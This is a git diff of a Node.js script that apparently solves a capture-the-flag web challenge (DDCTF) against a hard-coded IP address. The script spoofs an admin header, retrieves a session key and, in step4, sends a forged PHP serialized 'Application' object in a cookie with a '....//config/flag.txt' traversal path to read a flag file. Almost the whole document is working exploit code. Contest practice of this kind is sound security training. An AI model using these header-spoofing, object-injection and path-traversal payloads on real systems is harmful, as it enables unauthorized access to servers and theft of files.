@@ -4,6 +4,17 @@ const FormData = require('form-data')
 
 const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'
 
+const base64 = {
+  encode (str, encoding = 'utf8') {
+    let buf = new Buffer(str, encoding)
+    return buf.toString('base64')
+  },
+  decode (str, encoding = 'utf8') {
+    let buf = new Buffer(str, 'base64')
+    return buf.toString(encoding)
+  }
+}
+
 function serialize (body) {
   return body.replace(/}{/g, '}\n{').split('\n').map((str) => JSON.parse(str))
 }
@@ -16,19 +27,19 @@ const gotty = got.extend({
 })
 
 async function step1 () {
-  const response = await gotty.post('http://117.51.158.44/app/Auth.php', {
+  const response = await gotty.post('http://117.51.158.44/./././app/Auth.php', {
     headers: {
       didictf_username: 'admin',
     },
   })
-  const message = serialize(response.body)[0].data
-  console.log(message)
+  const data = serialize(response.body)[0]
+  // console.log(data)
   // message: 您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php
-  return
+  return data
 }
 
 async function step2 () {
-  const url = 'http://117.51.158.44/app/Session.php?path=123456789012345678'
+  const url = 'http://117.51.158.44/app/Session.php'
 
   async function createCookieJar () {
     const jar = new CookieJar()
@@ -73,29 +84,31 @@ async function step2 () {
 
   const jar = await createCookieJar()
   const message = await(fetchKey(jar))
-  return {
-    jar,
-    message,
-  }
+  return message
 }
 
-// async function step3 (jar) {
-//   const response = await gotty.post('http://117.51.158.44//./app/Session.php', {
-//     headers: {
-//       didictf_username: 'admin',
-//     },
-//     cookieJar: jar,
-//   })
-//   console.log(response)
-//   // const message = serialize(response.body)[0].data
-//   // console.log(message)
-//   return
-// }
+async function step4 () {
+  const session = 'O:11:"Application":1:{s:4:"path";s:21:"....//config/flag.txt";}77cd55a8d29df4f005f85e536d876525'
+  const response = await gotty.post('http://117.51.158.44/app/Session.php?', {
+    headers: {
+      didictf_username: 'admin',
+      cookie: `ddctf_id=${encodeURIComponent(session)};`,
+    },
+  })
+  // console.log(response)
+  // console.log(serialize(response.body))
+  return serialize(response.body)[1].data
+}
 
 async function main () {
-  // await step1()
-  let { jar } = await step2()
-  // await step3(jar)
+  console.log('Step1: ---')
+  console.log(await step1())
+  console.log('Step2: ---')
+  console.log(await step2())
+  console.log('Step3: ---')
+  console.log('use serialize.php to do step3')
+  console.log('Step4: ---')
+  console.log(await step4())
 }
 
 main()
